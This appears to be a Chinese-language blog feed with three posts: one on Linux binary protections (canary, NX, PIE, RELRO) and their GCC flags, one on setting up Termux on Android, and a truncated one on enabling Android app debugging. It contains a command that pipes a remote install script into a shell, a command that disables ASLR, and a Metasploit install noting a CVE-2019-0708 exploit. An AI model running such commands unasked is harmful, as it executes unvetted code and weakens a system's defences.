00 00           mov    eax,0x0  4005b9:    e8 c2 fe ff ff           call   400480 &lt;gets@plt&gt;  4005be:    b8 00 00 00 00           mov    eax,0x0  4005c3:    48 8b 55 f8              mov    rdx,QWORD PTR [rbp-0x8]  4005c7:    64 48 33 14 25 28 00     xor    rdx,QWORD PTR fs:0x28  4005ce:    00 00  4005d0:    74 05                    je     4005d7 &lt;main+0x41&gt;  4005d2:    e8 89 fe ff ff           call   400460 &lt;__stack_chk_fail@plt&gt;  4005d7:    c9                       leave  4005d8:    c3                       ret</code></pre><h2 id="fno-stack-protector"><a href="#fno-stack-protector" class="headerlink" title="-fno-stack-protector"></a><code>-fno-stack-protector</code></h2><p><code>-fstack-protector</code> 参数取消对栈的保护，直接编译成程序所对应的汇编：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    48 83 ec 20              sub    rsp,0x20  40052e:    48 8d 45 e0              lea    rax,[rbp-0x20]  400532:    48 89 c7                 mov    rdi,rax  400535:    b8 00 00 00 00           mov    eax,0x0  40053a:    e8 d1 fe ff ff           call   400410 &lt;gets@plt&gt;  40053f:    b8 00 00 00 00           mov    eax,0x0  400544:    c9                       leave  400545:    c3                       ret</code></pre><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX 即 No-eXecute（不可执行）的意思，NX（即 Windows 下的 DEP，数据执行保护）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 Shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h2 id="Default（-z-noexecstack）"><a href="#Default（-z-noexecstack）" class="headerlink" title="Default（-z noexecstack）"></a>Default（<code>-z noexecstack</code>）</h2><p>默认开始 NX，栈上的数据不可执行：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-execstack"><a href="#z-execstack" class="headerlink" title="-z execstack"></a><code>-z execstack</code></h2><p>开启栈可执行后，栈上的代码可被执行，同时其他处内存部分都是读写执行全开：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r-xp    /home/beale/Test_Dir/main0x00601000         0x00602000         rwxp    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rwxp    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rwxp    mapped0x00007ffffffde000 0x00007ffffffff000 rwxp    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>一般情况下 NX 和地址空间分布随机化（ASLR）会同时工作。<a href="https://blog.csdn.net/spenghui/article/details/79910884" target="_blank" rel="noopener">ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责；但是只有在开启 ASLR 之后，PIE 才会生效。</a>内存地址随机化机制（Address Space Layout Randomization)，有以下三种情况（具体的 ASLR 和 PIE 的互相作用：<a href="https://www.cnblogs.com/rec0rd/p/7646857.html）：" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html）：</a></p><ol><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将 mmap 的基址，stack 和 Vdso 页面随机化。</li><li>2 - 表示在 1 的基础上增加 heap 的随机化。</li></ol><p>可以防范基于 ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。位置独立的可执行区域（Position-Independent Executables）使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（Return-Oriented Programming）方法变得难得多。</p><blockquote><p>Linux 关闭 PIE 的方法：</p><pre><code class="bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre></blockquote><h2 id="Default（-no-pie）"><a href="#Default（-no-pie）" class="headerlink" title="Default（-no-pie）"></a>Default（<code>-no-pie</code>）</h2><p>默认不开启。静态分析程序时所得到的地址都是运行时的真实地址，基地址为 0x400000：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    bf c4 05 40 00           mov    edi,0x4005c4  40052f:    e8 cc fe ff ff           call   400400 &lt;puts@plt&gt;  400534:    b8 00 00 00 00           mov    eax,0x0  400539:    5d                       pop    rbp  40053a:    c3                       ret</code></pre><p>与 gdb 调试的时候相同：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x400521 &lt;frame_dummy+33&gt;:    jmp    0x4004a0 &lt;register_tm_clones&gt;   0x400526 &lt;main&gt;:    push   rbp   0x400527 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x40052a &lt;main+4&gt;:    mov    edi,0x4005c4   0x40052f &lt;main+9&gt;:    call   0x400400 &lt;puts@plt&gt;   0x400534 &lt;main+14&gt;:    mov    eax,0x0   0x400539 &lt;main+19&gt;:    pop    rbp   0x40053a &lt;main+20&gt;:    ret</code></pre><h2 id="pie"><a href="#pie" class="headerlink" title="-pie"></a><code>-pie</code></h2><p><code>-fpie</code> 与 <code>-fPIE</code> 效果一样，用于编译；<code>-pie</code> 用于链接。开启 PIE 后的静态反编译结果没有基地址，每次运行时的基地址不同：</p><pre><code class="asm">0000000000000750 &lt;main&gt;: 750:    55                       push   rbp 751:    48 89 e5                 mov    rbp,rsp 754:    48 8d 3d 99 00 00 00     lea    rdi,[rip+0x99]        # 7f4 &lt;_IO_stdin_used+0x4&gt; 75b:    e8 90 fe ff ff           call   5f0 &lt;puts@plt&gt; 760:    b8 00 00 00 00           mov    eax,0x0 765:    5d                       pop    rbp 766:    c3                       ret</code></pre><p>gdb 调试时如下：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x55555555474b &lt;frame_dummy+43&gt;:    jmp    0x555555554690 &lt;register_tm_clones&gt;   0x555555554750 &lt;main&gt;:    push   rbp   0x555555554751 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x555555554754 &lt;main+4&gt;:    lea    rdi,[rip+0x99]        # 0x5555555547f4   0x55555555475b &lt;main+11&gt;:    call   0x5555555545f0 &lt;puts@plt&gt;   0x555555554760 &lt;main+16&gt;:    mov    eax,0x0   0x555555554765 &lt;main+21&gt;:    pop    rbp   0x555555554766 &lt;main+22&gt;:    ret[rip+0x99] : 0x5555555547f4 (&quot;Hello World&quot;)</code></pre><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC、GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro（Read Only Relocation）的技术。大概实现就是由 linker 指定程序的一块经过 dynamic linker 处理过 relocation 之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。RELRO 为 Partial RELRO，说明对 GOT 表具有写权限。</p><h2 id="Default（-z-lazy）"><a href="#Default（-z-lazy）" class="headerlink" title="Default（-z lazy）"></a>Default（<code>-z lazy</code>）</h2><p>默认情况下对 GOT 表具有写权限。可以看到 <code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分是可写的：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-norelro"><a href="#z-norelro" class="headerlink" title="-z norelro"></a><code>-z norelro</code></h2><p>没有开启 RELRO 的情况：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabledassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE00000000006008a8 R_X86_64_GLOB_DAT  __gmon_start__00000000006008c8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.500000000006008d0 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-now"><a href="#z-now" class="headerlink" title="-z now"></a><code>-z now</code></h2><p>此时无法修改 GOT 表。<code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分只有读权限：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULLassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600fe8 R_X86_64_GLOB_DAT  puts@GLIBC_2.2.50000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><p><img src="/pics/Linux下的各类程序保护机制/2.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/03/linux-pwn.html</a><br><a href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not" target="_blank" rel="noopener">https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not</a><br><a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld" target="_blank" rel="noopener">https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-pie.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-pie.html</a><br><a href="http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/" target="_blank" rel="noopener">http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Termux在Android上打造小型Linux服务器</title>
    <link href="/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>使用 Termux 可以在 Android 上获得极佳的终端体验。</p><a id="more"></a><p>一些基础按键就不记录了。然后在 Termux 上的包管理工具有 pkg 和 apt，和 Debian 的基本一样，对我们来说已经很熟悉了。下面只是做一些简短的记录，用于备份。</p><h1 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h1><p>在 Termux 手机界面上可以完美实现 oh-my-zsh 的 agnoster 主题，在 Github 上已经有人实现了对应的安装脚本：</p><pre><code class="bash">sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;</code></pre><p>具体的安装过程也不列举了，装完后会让我们选主题和字体。成功之后根目录下会有一个 storage 目录，映射了手机系统上的一些文件夹，方便文件传输：</p><pre><code class="bash">$ ls -l storagetotal 24lrwxrwxrwx 1 u0_a146 u0_a146 26 Mar  1 12:45 dcim -&gt; /storage/emulated/0/DCIMlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 downloads -&gt; /storage/emulated/0/Downloadlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 movies -&gt; /storage/emulated/0/Movieslrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 music -&gt; /storage/emulated/0/Musiclrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 pictures -&gt; /storage/emulated/0/Pictureslrwxrwxrwx 1 u0_a146 u0_a146 22 Mar  1 12:45 shared -&gt; /storage/emulated/0</code></pre><p>同样，我们可以给 QQ 的文件传输整一个软链接：</p><pre><code class="bash">ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ</code></pre><p>如此一来，传输文件就方便了很多：</p><pre><code class="bash">$ ls -al...lrwxrwxrwx 1 u0_a146 u0_a146   70 Mar  1 16:05 QQ -&gt; /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv...</code></pre><p>还能修改启动时的问候语：</p><pre><code class="bash">cp $PREFIX/etc/motd $PREFIX/etc/motd.bakvim $PREFIX/etc/motd</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/1.png" srcset="/img/loading.gif" alt></p><h1 id="Change-apt-sources"><a href="#Change-apt-sources" class="headerlink" title="Change apt-sources"></a>Change apt-sources</h1><p>给 apt 换个清华源：</p><pre><code class="bash">export EDITOR=viapt edit-sources</code></pre><p>修改为以下内容：</p><pre><code class="txt"># The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</code></pre><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>接下来装个 SSH，用电脑连上更方便地进行后续的安装。</p><pre><code class="bash">apt updateapt upgradeapt install openssh</code></pre><p>将电脑的公钥 push 到手机上：</p><pre><code class="bash">adb push ~/.ssh/id_rsa.pub /sdcard/authorized_keys</code></pre><p>在 Termux 中把电脑公钥放在 <code>.ssh</code> 目录下，并设置 authorized_keys 文件为拥有者只读。最后启动服务：</p><pre><code class="bash">cd .sshmv /sdcard/authorized_keys .chmod 400 authorized_keyssshd</code></pre><p>在电脑上转发 adb 端口并连接：</p><pre><code class="bash">adb forward tcp:8022 tcp:8022ssh localhost -p 8022</code></pre><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python 必不可少。默认 Python 指 Python3，Python2 指 Python2：</p><pre><code class="bash">apt install python2apt install python # python3</code></pre><h1 id="IPython"><a href="#IPython" class="headerlink" title="IPython"></a>IPython</h1><p>IPython 的安装必须有 clang 的依赖，否则会报错：</p><pre><code class="bash">apt install clangpip install ipythonpip3.6 install ipython</code></pre><h1 id="tsu"><a href="#tsu" class="headerlink" title="tsu"></a>tsu</h1><p>用 tsu 替代 su 可以完美实现 root 转换：</p><pre><code class="bash">apt install tsu</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/2.png" srcset="/img/loading.gif" alt></p><h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>需要联（ke）网（xue）下载：</p><pre><code class="bash">apt install unstable-repoapt install metasploit</code></pre><p>输入 msfconsole 可以查看效果：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/3.png" srcset="/img/loading.gif" alt></p><p>这个版本也已经有 CVE-2019-0708 的 EXP 了：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/4.png" srcset="/img/loading.gif" alt></p><h1 id="Termux-API"><a href="#Termux-API" class="headerlink" title="Termux-API"></a>Termux-API</h1><p>其它很多软件像是 Nmap、SQLMap 等等，还有 Github 上的项目都基本和 Linux 中一模一样，可以用 apt 还有 pip 等管理器进行安装。下面记录一下 Termux-API 这一工具。首先要安装一下 <a href="https://play.google.com/store/apps/details?id=com.termux.api" target="_blank" rel="noopener">Termux:API</a> 这一 APP，然后用 apt 安装命令行：</p><pre><code class="bash">apt install termux-api</code></pre><p>获取电池信息：</p><pre><code class="bash">$ termux-battery-status{  &quot;health&quot;: &quot;GOOD&quot;,  &quot;percentage&quot;: 100,  &quot;plugged&quot;: &quot;PLUGGED_USB&quot;,  &quot;status&quot;: &quot;FULL&quot;,  &quot;temperature&quot;: 22.700000762939453,  &quot;current&quot;: -38757}</code></pre><p>获取相机信息：</p><pre><code class="bash">$ termux-camera-info</code></pre><p>获取与设置剪切板：</p><pre><code class="bash">$ termux-clipboard-set thisisassassinq$ termux-clipboard-getthisisassassinq</code></pre><p>获取通讯录列表：</p><pre><code class="bash">$ termux-contact-list</code></pre><p>拨打电话：</p><pre><code class="bash">$ termux-telephony-call 10001</code></pre><p>获取当前 Wi-Fi 连接信息：</p><pre><code class="bash">$ termux-wifi-connectioninfo{  &quot;bssid&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;frequency_mhz&quot;: 2412,  &quot;ip&quot;: &quot;192.168.101.68&quot;,  &quot;link_speed_mbps&quot;: 144,  &quot;mac_address&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;network_id&quot;: 0,  &quot;rssi&quot;: -53,  &quot;ssid&quot;: &quot;&lt;unknown ssid&gt;&quot;,  &quot;ssid_hidden&quot;: true,  &quot;supplicant_state&quot;: &quot;COMPLETED&quot;}</code></pre><p>获取最近一次 Wi-Fi 扫描信息：</p><pre><code class="bash">$ termux-wifi-scaninfo</code></pre><h1 id="nyancat"><a href="#nyancat" class="headerlink" title="nyancat"></a>nyancat</h1><p>彩虹猫是在 2011 年 4 月上传在 YouTube 的视频，并且迅速爆红于网络，并在 2011 年 YouTube 浏览量最高的视频中排名第五。这个视频内容为一只卡通的猫咪飞翔在宇宙中，身后拖出一条彩虹，并且配上了 UTAU 虚拟歌手桃音モモ所演唱的背景音乐。终端版本下载：</p><pre><code class="bash">apt install nyancat</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/5.png" srcset="/img/loading.gif" alt></p><h1 id="终端二维码"><a href="#终端二维码" class="headerlink" title="终端二维码"></a>终端二维码</h1><p>生成终端二维码（字体没选好，效果不太好）：</p><pre><code class="bash">echo &quot;https://qianfei11.github.io&quot; | curl -F-=\&lt;- qrenco.de</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/6.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mushuichuan.com/2017/12/10/termux/" target="_blank" rel="noopener">https://mushuichuan.com/2017/12/10/termux/</a><br><a href="http://blackwolfsec.cc/2016/12/10/termux/" target="_blank" rel="noopener">http://blackwolfsec.cc/2016/12/10/termux/</a><br><a href="https://www.sqlsec.com/2018/05/termux.html" target="_blank" rel="noopener">https://www.sqlsec.com/2018/05/termux.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不同版本Android动态调试前打开调试开关简述</title>
    <link href="/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/"/>
    <url>/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<p>手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>众所周知，最常规的方法就是在 AndroidManifest.xml 中的 application 标签中添加 <code>android:debuggable=&quot;true&quot;</code> 字段，然后再回编译、签名、安装、然后进行动态调试。但这种方法实在太麻烦了。</p><p>网上还有另外一种修改 Android prop 的工具 <a href="https://github.com/wpvsyou/mprop" target="_blank" rel="noopener">mprop</a>，用来修改 <code>default.prop</code> 中的 <code>ro.debuggable</code> 字段为 1（默认为 0）。因为 Android 系统初始化时，init 进程会解析系统属性文件，然后将其保存到内存中去，以便给所有应用提供服务（这种方法可以直接调试所有应用），所以在 init 进程的内存块中是存在这些属性的。在修改完成后要重启 adbd 进程，但这种方法的缺点是在每次开关机后需要重新修改。</p><p>最好的方法是能够直接安装一个程序，能够直接开启所有程序的调试，并且在开关机后也不需要重新设置。</p><h1 id="Android-4"><a href="#Android-4" class="headerlink" title="Android 4"></a>Android 4</h1><p>设备：Nexus 5</p><p>开启动态调试的要求是已 root，并且安装了 Xposed 框架。</p><h2 id="BDOpener"><a href="#BDOpener" class="headerlink" title="BDOpener"></a>BDOpener</h2><p><a href="https://github.com/riusksk/BDOpener" target="_blank" rel="noopener">BDOpener 下载链接</a></p><p>这里使用的是 BDOpener，这是一款 Xposed 的模块，用于修改程序的 debugable 选项，同时也支持开启备份选项，方便数据转移。只需要安装程序后，启用并重启手机，就能调试，可以用 monitor 来查看效果。</p><p><img src="/pics/不同版本Android动态调试前打开调试开关简述/1.png" srcset="/img/loading.gif" alt></p><h1 id="Android-9"><a href="#Android-9" class="headerlink" title="Android 9"></a>Android 9</h1><p>设备：Pixel XL</p><p>开启动态调试的要求是安装了 Magisk 框架（安装后默认 root）。因为 Xposed 的作者在 Android 6 后没有再更新，后来 Android 7 只出了非官方版本，尝试采用了 Magisk+Taichi 的方式来使用上面的 Xposed 模块，但安装了之后发现 Android UI 会在开机之后崩溃，所以尝试了另外一种方法。</p><h2 id="MagiskHidePropsConf"><a href="#MagiskHidePropsConf" class="headerlink" title="MagiskHidePropsConf"></a><a href="https://forum.xda-developers.com/apps/magisk/module-magiskhide-props-config-t3789228" target="_blank" rel="noopener">MagiskHidePropsConf</a></h2><p><a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf" target="_blank" rel="noopener">MagiskHidePropsConf 下载链接</a></p><p><a href="https://github.com/osm0sis/android-busybox-ndk" target="_blank" rel="noopener">Busybox 下载链接</a></p><p>MagiskHidePropsConf 是 Magisk 下的一个模块，可以用来修改系统中内存里的 props 值，并且永久生效，那么就可以用来修改 <code>ro.debuggable</code> 字段了。同时要求安装 Busybox for Android NDK 